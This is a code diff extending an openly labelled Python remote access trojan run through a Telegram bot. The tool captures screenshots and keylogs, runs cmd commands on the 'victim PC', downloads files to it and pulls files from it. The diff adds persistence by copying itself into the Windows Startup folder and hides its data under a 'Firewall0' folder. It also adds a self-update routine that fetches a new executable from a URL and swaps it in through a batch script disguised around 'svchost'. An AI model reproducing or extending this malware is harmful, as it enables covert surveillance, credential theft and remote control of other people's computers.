@@ -32,10 +32,12 @@ USER = getpass.getuser()
 # count_letter = 0
 # count_scremail = 0
 # check_count = 1234
-
-SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\CandC'
+CURR_FILE_PATH = os.path.realpath(__file__)
+CURR_FILE_NAME = os.path.basename(__file__)
+SAVE_FILES = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Local\Firewall0'
 USERDATA_PATH = SAVE_FILES + "\\User Data\\"
 driveTreefile_name = USERDATA_PATH + 'DirectoryTree.txt'
+STARTUP_PATH = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + '\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup'
 key_log = USERDATA_PATH + "keylog111.txt" 
 current_system_time = datetime.datetime.now()
 keylogger_stat = 0
@@ -50,6 +52,11 @@ keylog_data = '_'
 default_download_location = os.environ.get('HOMEDRIVE') + os.environ.get('HOMEPATH') + "\\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\\"
 download_step = 0
 get_file_tele_step = 0
+update_rat_step = 0
+# updated_RAT_path = 'firewall_updated.exe'
+
+
+
 
 def sendKeylogs():
     global keylog_data
@@ -71,7 +78,7 @@ def checkKeylogSize():
 
 def internetOn(url='https://www.google.com/', timeout=5):
     try:
-        _ = requests.get(url, timeout=timeout)
+        response = requests.get(url, timeout=timeout)
         return True
     except requests.ConnectionError:
         print("No internet connection available.")
@@ -93,7 +100,7 @@ def screenshot():
 
 
 def MainMenu_Send():
-    global change_rec_time_step, get_url_step, cmd_step, cmd, url, download_step, get_file_tele_step
+    global change_rec_time_step, get_url_step, cmd_step, cmd, url, download_step, get_file_tele_step, update_rat_step
     change_rec_time_step = 0
     get_url_step = 0
     cmd_step = 0
@@ -101,7 +108,7 @@ def MainMenu_Send():
     url = ''
     download_step = 0
     get_file_tele_step = 0
-
+    update_rat_step = 0
     #content_type, chat_type, chat_id = telepot.glance(msg)
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text= "🌟 Get Screenshot", callback_data = 'screenshot')],
@@ -113,7 +120,8 @@ def MainMenu_Send():
        [InlineKeyboardButton(text= "🌴 Directory List", callback_data = 'directory_list')],
        [InlineKeyboardButton(text= "🔋 Run cmd command", callback_data = 'run_cmd_command')],
        [InlineKeyboardButton(text= "📥 Download a file to victim PC (via link)", callback_data = 'down_via_link')],
-       [InlineKeyboardButton(text= "📧 Get a file from victim PC (via Telegram)", callback_data = 'getfile_via_tele')]
+       [InlineKeyboardButton(text= "📧 Get a file from victim PC (via Telegram)", callback_data = 'getfile_via_tele')],
+       [InlineKeyboardButton(text= "🐀 UPDATE RAT", callback_data = 'update_rat')]
        ]
        )
 
@@ -215,12 +223,54 @@ def getFileTele(step, dest):
             bot.sendMessage(CHAT_ID, str(e))
         get_file_tele_step = 0
 
+def updateRAT(step):
+    keyboard = InlineKeyboardMarkup(inline_keyboard=[
+               [InlineKeyboardButton(text= "Return to Main Menu", callback_data = 'return_main_menu')]]
+               )
+    global update_rat_step
+    if step == 1:
+        update_rat_step = 1
+        bot.sendMessage(CHAT_ID, "Upload the updated exe:", reply_markup=keyboard)
+    elif step == 2:
+        bot.sendMessage(CHAT_ID, "Please wait while you see respond from the updated RAT!!!")
+        bat_script = "timeout /t 3 /nobreak\ndel " + "svchost" + ".exe\nren " + "svchost" + "_updated.exe" + CURR_FILE_NAME + "\nstart /MIN " + CURR_FILE_NAME + "\nEXIT"
+        with open('helper.bat', 'w') as the_file:
+            the_file.write(bat_script)
+        time.sleep(1)
+        os.system("start /min helper.bat")
+        #import sys
+        os._exit(0)
+        
+        
+
+
+
 def startUpWork():
+    if not os.path.exists(SAVE_FILES):
+        try:
+            os.makedirs(SAVE_FILES)
+            os.makedirs(USERDATA_PATH)
+        except:
+            print("Directory already exists!")
+    
+    
+    # print(CURR_FILE_PATH)
+    # print('copy ' + CURR_FILE_PATH + ' ' + SAVE_FILES + "\\" )
+    if os.path.isfile(STARTUP_PATH + "\\" + CURR_FILE_NAME) == False:
+        print(os.system('copy "' + CURR_FILE_PATH + '" "' + STARTUP_PATH + '\\"' ))
     if internetOn() == True:
+        try:
+            os.system("del helper.bat")
+            #bot.sendMessage(CHAT_ID, "helper.bat was removed.\nRAT was updated successfully!!! ^_^")
+        except:
+            pass
+    
         bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
         screenshot()
         MainMenu_Send()
-        
+        return True
+    elif internetOn() == False:
+        return False
  
 def on_callback_query(msg):
     query_id, from_id, query_data = telepot.glance(msg, flavor='callback_query')
@@ -302,14 +352,19 @@ def on_callback_query(msg):
         download(1, url, default_download_location)
     elif query_data == 'getfile_via_tele':
         getFileTele(1, ' ')
+    elif query_data == 'update_rat':
+        updateRAT(1)
 
 def on_chat_message(msg):
     global change_rec_time_step
     global default_rec_time
     global get_url_step
-    global url, cmd
+    global url, cmd, update_rat_step
     content_type, chat_type, chat_id = telepot.glance(msg)
-    if change_rec_time_step == 1:
+    if content_type == 'text' and msg['text'] == 'whoisonline':
+        bot.sendMessage(CHAT_ID, USER + " is online!\nMAC: " + MAC_ADDRESS + "\nPlatform: " + PLAT_FORM)
+        MainMenu_Send()
+    elif change_rec_time_step == 1:
         if content_type == 'text' and isinstance(int(msg['text']), int) == True:
             change_rec_time_step = 0
             default_rec_time = int(msg['text'])
@@ -338,6 +393,23 @@ def on_chat_message(msg):
         get_file_tele_step == 0
         getFileTele(2, str(msg['text']))
         MainMenu_Send()
+    elif update_rat_step == 1:
+        update_rat_step = 0
+        if content_type == 'text':
+            try:
+                url0 = msg['text']
+                r = requests.get(url0)
+                with open(SAVE_FILES + "\\" + url0.split('/')[-1], 'wb') as f:
+                    f.write(r.content)
+                bot.sendMessage(CHAT_ID, "File was downloaded in: " + default_download_location)
+                updateRAT(2)
+            except Exception as e:
+                print(str(e))
+                bot.sendMessage(CHAT_ID, "File wasn't downloaded & updated!!!")
+                MainMenu_Send()
+            
+        else:
+            MainMenu_Send()
         
     else:
         bot.sendMessage(CHAT_ID, "Invalid Command!!!")
@@ -352,6 +424,8 @@ MessageLoop(bot, {'chat': on_chat_message,
 
 print("Listening...")
 startUpWork()
+'''while startUpWork() == False:
+    startUpWork()'''
         
 
 while 1:
